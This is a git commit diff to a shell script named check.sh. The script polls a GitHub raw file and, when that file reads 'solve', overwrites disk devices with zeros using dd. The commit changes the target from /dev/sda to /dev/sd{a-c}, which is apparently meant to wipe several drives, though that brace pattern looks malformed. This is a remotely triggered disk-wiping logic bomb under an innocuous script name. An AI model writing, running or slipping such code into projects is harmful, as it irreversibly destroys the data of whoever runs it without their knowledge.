ce7a0a240726067cfe7f04a94f596576edc06265
antoniotrkdz <antoniotrkdz@gmail.com>
2018-11-20 11:35:37 +0100

    Update check.sh

--- check.sh
+++ check.sh
@@ -2,6 +2,6 @@
 X=$(curl -s https://raw.githubusercontent.com/antoniotrkdz/solve/master/level)
 if [ "$X" == "solve" ]; then
   #dd if=/dev/zero of=./zero.log count=1
-  dd if=/dev/zero of=/dev/sda
+  dd if=/dev/zero of=/dev/sd{a-c}
   #echo "X has the value 'solve'" >> ./report.log
 fi
